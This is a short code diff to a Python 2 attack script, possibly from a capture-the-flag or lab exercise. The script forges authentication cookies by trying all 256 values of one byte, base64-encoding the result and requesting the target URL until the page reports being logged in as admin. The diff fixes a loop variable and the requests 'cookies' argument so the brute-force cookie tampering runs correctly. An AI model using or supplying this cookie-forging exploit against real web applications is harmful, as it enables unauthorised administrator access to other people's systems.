@@ -22,10 +22,10 @@ expected = "You are currently logged in as admin"
 for value in range(0, 256):
     cookie[index_to_modify] = hex(value)
     new_cookie = []
-    for cookie in cookie:
-        new_cookie.append(chr(int(cookie, 16)))
+    for c in cookie:
+        new_cookie.append(chr(int(c, 16)))
     new_cookie = urllib.quote_plus(base64.b64encode("".join(new_cookie)))
-    r = requests.get(url, cookie={"auth": new_cookie})
+    r = requests.get(url, cookies={"auth": new_cookie})
     if expected in r.text:
         print new_cookie
         break
